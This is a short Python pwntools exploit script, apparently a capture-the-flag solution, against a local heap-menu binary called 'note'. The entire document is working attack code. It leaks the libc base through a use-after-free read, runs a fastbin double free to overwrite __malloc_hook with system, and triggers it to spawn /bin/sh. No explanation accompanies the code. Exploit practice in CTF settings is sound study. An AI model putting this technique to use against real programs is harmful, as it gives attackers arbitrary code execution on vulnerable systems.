from pwn import *

p = process('./note')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def add(size, note):
    p.sendlineafter('>', '1')
    p.sendlineafter(': ', str(size))
    p.sendlineafter(': ', note)

def show(index):
    p.sendlineafter('>', '2')
    p.sendlineafter(': ', str(index))

def delete(index):
    p.sendlineafter('>', '3')
    p.sendlineafter(': ', str(index))

add(0x100, 'aaaa')
add(0x60, 'aaaa')
add(0x60, 'aaaa')
delete(0)
show(0)
p.recvuntil('0:\n')
base = u64(p.recvline().strip().ljust(8, b'\x00')) - 0x3c4b78
success('libc base = %x', base)
system = base + libc.symbols['system']

delete(1)
delete(2)
delete(1)
add(0x60, p64(base + libc.symbols['__malloc_hook'] - 0x10 - 19))
add(0x60, 'aaaa')
add(0x60, 'aaaa')
add(0x60, b'a'*19+p64(system))
sh = next(libc.search(b'/bin/sh\x00')) + base
p.sendlineafter('>', '1')
p.sendlineafter(':', str(sh))

p.interactive()
